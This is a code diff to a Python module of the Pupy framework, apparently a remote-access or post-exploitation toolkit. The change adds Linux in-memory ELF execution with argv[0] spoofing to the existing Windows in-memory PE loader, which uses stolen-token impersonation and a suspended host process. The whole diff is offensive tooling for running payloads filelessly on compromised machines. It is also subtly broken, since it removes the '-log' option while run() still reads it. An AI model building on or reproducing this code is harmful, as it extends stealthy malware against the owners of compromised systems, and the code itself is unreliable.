@@ -19,30 +19,37 @@ from pupylib.utils.pe import get_pe_arch
 from pupylib.PupyErrors import PupyModuleError
 from pupylib.utils.rpyc_utils import redirected_stdio
 from modules.lib.windows.memory_exec import exec_pe
+from modules.lib.linux.exec_elf import mexec
 import time
+
+from os import path
 
 __class_name__="MemoryExec"
 
-@config(compatibilities=["windows"], category="manage")
+@config(compatibilities=["windows", "linux"], category="manage")
 class MemoryExec(PupyModule):
     """
-        Execute a PE executable from memory
-        The default behavior is to accept arguments and print stdout of the program once it exits or after timeout seconds
+        Execute a executable from memory
     """
+
     interactive=1
+    dependencies = {
+        'linux': [ 'memexec' ],
+        'windows': [ 'pupymemexec', 'pupwinutils.memexec' ]
+    }
+
     def __init__(self, *args, **kwargs):
         PupyModule.__init__(self,*args, **kwargs)
-        self.interrupted=False
-        self.mp=None
+        self.interrupted = False
+        self.mp = None
+
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog="memory_exec", description=self.__doc__)
         #self.arg_parser.add_argument('-p', '--process', default='cmd.exe', help='process to start suspended')
-        self.arg_parser.add_argument('--fork', action='store_true', help='fork and do not wait for the child program. stdout will not be retrieved')
         self.arg_parser.add_argument('-i', '--interactive', action='store_true', help='interact with the process stdin.')
         self.arg_parser.add_argument('-m', '--impersonate', action='store_true', help='use the current impersonated token (to use with impersonate module)')
         self.arg_parser.add_argument('-s', '--suspended-process', default="cmd.exe", help='change the suspended process to spawn (default: cmd.exe)')
-        self.arg_parser.add_argument('--timeout', metavar='<timeout>', type=float, help='kill the program after <timeout> seconds if it didn\'t exit on its own')
-        self.arg_parser.add_argument('-log', help='Save log to file (when process is not interactive)')
+        self.arg_parser.add_argument('-0', '--argv0', help='Set argv[0] (linux only)')
         self.arg_parser.add_argument('path', help='path to the exe', completer=path_completer)
         self.arg_parser.add_argument('args', nargs=argparse.REMAINDER, help='optional arguments to pass to the exe')
 
@@ -50,13 +57,22 @@ class MemoryExec(PupyModule):
         self.info("interrupting remote process, please wait ...")
         if self.mp:
             self.mp.close()
-            res=self.mp.get_stdout()
-            self.log(res)
-
-
 
     def run(self, args):
-        log = exec_pe(self, args.args, path=args.path, interactive=args.interactive, fork=args.fork, timeout=args.timeout, use_impersonation=args.impersonate, suspended_process=args.suspended_process)
-        if args.log:
+        if self.client.is_windows():
+            log = exec_pe(
+                self, args.args,
+                path=args.path, interactive=args.interactive,
+                use_impersonation=args.impersonate,
+                suspended_process=args.suspended_process
+            )
+        elif self.client.is_linux():
+            log = mexec(
+                self, args.path, args.args,
+                argv0=args.argv0 or path.basename(args.path),
+                interactive=args.interactive
+            )
+
+        if log and args.log:
             with open(args.log, 'wb') as output:
                 output.write(log)
